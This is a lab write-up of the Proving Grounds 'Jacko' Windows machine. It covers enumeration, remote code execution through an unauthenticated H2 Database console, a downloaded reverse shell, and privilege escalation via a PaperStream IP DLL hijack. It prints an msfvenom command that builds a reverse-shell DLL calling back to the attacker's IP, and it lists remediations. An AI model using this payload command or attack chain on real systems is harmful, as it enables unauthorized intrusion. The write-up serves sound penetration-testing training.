---
layout: writeup
title: Jacko - Proving Grounds
date: 2024-08-09 13:32:20 +0300
description: A Writeup of the Jacko Box from Proving Grounds
image: # /assets/images/Jacko/Jacko1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, LainKusanagi]
---

Today I'm doing a writeup for a [Proving Grounds](https://www.offsec.com/labs/) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Jacko, and it is rated Intermediate by Proving Grounds and Hard by the community. As usual, we get started with an nmap (`sudo nmap -A -sC -v -p- --open 192.168.245.66 -oN nmap`) which (gives more detail but) shows these open ports:

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8082/tcp  open  blackice-alerts
9092/tcp  open  XmlIpcRegSvc
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```


I check out port 80 which shows documentation for an app called H2 Database Engine:

![Jacko1.png](/assets/images/Jacko/Jacko1.png){: .responsive-image}

I click around to look for a version, but I can't find one. From reading about it a little bit, it looks like a way to manage/use an SQL database using the browser. I can also check port 8082, and it looks like that may be where the actual app is hosted. Port 80 may just be docs. 

![Jacko2.png](/assets/images/Jacko/Jacko2.png){: .responsive-image}

If I try to exploit the app, it may need to be done here on this port. I do note that when I click `Test Connection`, it does say "Test successful." So it's set up. And I didn't need to add a password. When I searched exploit-db for potential exploits for "H2 Database", I see a couple of interesting ones. [This](https://www.exploit-db.com/exploits/44422) one even has a default user of "sa" and default password of "", so that points to us being able to use `sa: ` for creds, as shown already in the screenshot. I copy this exploit to my machine and attempt to run it, but I get an error:

![Jacko3.png](/assets/images/Jacko/Jacko3.png){: .responsive-image}

It was basically the same for [this](https://www.exploit-db.com/exploits/45506) one from exploit-db and [this](https://gist.githubusercontent.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py) on from github, which appears to have been built off the former. But if we go back to port 8082 and try to actually connect, we can see that even though the connection is already established, we are taken to a portal:

![Jacko4.png](/assets/images/Jacko/Jacko4.png){: .responsive-image}


That explains how we are able to use [this exploit](https://www.exploit-db.com/exploits/49384) which at first glance appeared to require to be executed locally on the target machine. That linked exploit from exploit-db gives three commands to run consecutively, with the last one executing a `whoami` command as a test. The result:

![Jacko5.png](/assets/images/Jacko/Jacko5.png){: .responsive-image}

The service is being run as `jacko\tony`. We can use this to download a reverse shell and run it. Simply using nc to call our kali machine does not appear to work as the target cannot find the nc.exe file. Note that the file must be written to a writable directory, such as `C:\Users\tony\rev.exe`, but that in this case the `\`'s must be escaped, making the full path `C:\\Users\\tony\\rev.exe`. You can tell this because if you leave them out, you get an error saying there are too many arguments. If you try a number of other commands to get more information and see that the `\` mis removed in some of them in the output. 

![Jacko6.png](/assets/images/Jacko/Jacko6.png){: .responsive-image}

We have a shell. It quickly becomes clear that we cannot run some commands as-is but need to call the full path i.e. `C:\Windows\System32\whoami.exe` instead of `whoami`. I check my privileges with the `/priv` flag and see that we have `SeImpersonatePrivilege`, but I am not able to run a Potato attack such as PrintSpoofer:

![Jacko7.png](/assets/images/Jacko/Jacko7.png){: .responsive-image}

I transfer and run winpeas.exe at this point, but there's nothing that especially sticks out. At that point it makes sense to look around and see if there is anything interesting. There are a couple of unusual applications in the `Program Files (x86)` directory: 

![Jacko8.png](/assets/images/Jacko/Jacko8.png){: .responsive-image}

It looks like fiScanner provides functionality for scanning documents which could potentially have some kind of exploit, but I don't find any. PaperStream IP is driver software for a scanner, and it does have a public [Local Privesc exploit](https://www.exploit-db.com/) on exploit-db. The exploit tells you how to generate a dll file and where to put it before running the exploit. 

![Jacko9.png](/assets/images/Jacko/Jacko9.png){: .responsive-image}

We should also note that it is a powershell script (`.ps1`), either from looking at it or using searchsploit to copy it to our directory and noting the extension. Powershell is not located in the same directory as the other commands, so to enable it you must call the full path like so: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` Then you can run powershell commands. Unfortunately, when I run the `.ps1`, it does not do anything. This is because the msfvenom script suggested is for a 64-bit machine, and the target is a 32-bit machine. The msfvenom script should actually be: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.240 LPORT=445 -f dll -a x86 --platform windows -o 445.dll`. When we transfer that to the `C:\Windows\Temp` directory as before. 

![Jacko10.png](/assets/images/Jacko/Jacko10.png){: .responsive-image}

### Lesson Learned
Apparently in cases like this where we have to call the full path, we can just set the path by running: `set PATH=%SystemRoot%\system32;%SystemRoot%;`. I probably should have known there was a way to do that. 

### Remediations Steps
- Add a password to the H2 Database user
- Patch the H2 Database application
- Patch the PaperStream application
- Consider disabling the `SeImpersonatePrivilege` for user:`tony` if not required. I didn't wind up using it, but I did find a writeup that did (along with a meterpreter shell). [That writeup](https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e) used GodPotato to get a shell that died multiple times, but I tried with SweetPotato and PrintSpoofer and did not get any kind of response. 